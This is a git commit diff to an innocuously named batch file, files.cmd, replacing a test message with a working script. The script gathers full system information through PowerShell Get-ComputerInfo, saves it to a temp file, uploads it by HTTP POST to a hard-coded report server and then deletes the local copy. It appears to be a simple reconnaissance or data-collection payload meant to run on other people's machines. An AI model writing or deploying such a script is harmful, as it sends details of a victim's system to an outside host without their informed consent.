6519e6f3ceeff4d06c10efd658e6c9d1c6626c18
zxkp_ <74900164+NooDvdiscord@users.noreply.github.com>
2024-08-27 16:35:06 +0300

    Update files.cmd

--- files.cmd
+++ files.cmd
@@ -1,2 +1,12 @@
 @echo off
-msg * "I guess it is working now!!!"
+set "server_url=http://192.168.1.10:5000/report"  :: Replace with your actual IP address
+set "temp_file=%TEMP%\system_info.json"
+powershell -Command ^
+    "$headers = @{ 'Content-Type' = 'application/json' }; " ^
+    "Get-ComputerInfo | ConvertTo-Json | Out-File -FilePath '%temp_file%'; " ^
+    "Invoke-RestMethod -Uri '%server_url%' -Method Post -InFile '%temp_file%' -Headers $headers"
+
+del "%temp_file%"
+
+echo System information sent to the server.
+pause
